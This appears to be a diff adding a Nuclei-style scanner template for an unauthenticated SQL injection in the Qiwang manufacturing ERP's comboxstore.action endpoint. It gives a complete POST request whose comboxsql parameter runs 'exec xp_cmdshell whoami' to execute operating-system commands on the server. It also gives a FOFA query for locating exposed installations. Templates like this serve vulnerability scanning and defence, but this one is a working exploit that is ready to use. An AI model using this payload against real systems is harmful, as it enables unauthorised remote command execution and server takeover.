@@ -1,0 +1,35 @@
+
+id: qiwang-erp-sql-comboxstore
+
+info:
+  name: qiwang-erp-sql-comboxstore
+  author: p1z
+  severity: critical
+  description: |
+    企望制造 ERP comboxstore.action 接口可执行任意SQL语句，利用xp_cmdshell函数可远程执行命令，未经认证的攻击者可通过该漏洞获取服务器权限。
+  reference:
+    - https://blog.csdn.net/holyxp/article/details/132363248
+  metadata:
+    fofa-query: product="企望-ERP系统"
+    hunter-query: 
+    verified: true
+  tags: 2023,qiwang,erp,sql 
+
+requests:
+  - raw:
+    - |
+      POST /mainFunctions/comboxstore.action HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+      Connection: close
+      Content-Length: 39
+
+      comboxsql=exec+xp_cmdshell+%27whoami%27      
+
+    matchers:
+      - type: word
+        words:
+          - 'Value'
+        part: body
+
